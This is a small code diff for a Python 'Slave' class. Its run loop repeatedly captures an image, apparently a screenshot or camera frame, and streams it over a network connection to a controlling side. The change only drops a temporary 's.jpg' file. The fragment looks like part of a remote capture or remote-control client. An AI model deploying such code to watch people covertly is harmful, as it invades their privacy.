@@ -10,6 +10,6 @@ class Slave:
 
     def run(self):
         while True:
-            capture('s.jpg')
-            self.connection.send(open('s.jpg', 'rb').read())
+            self.connection.send(capture())
             self.connection.recv()
+
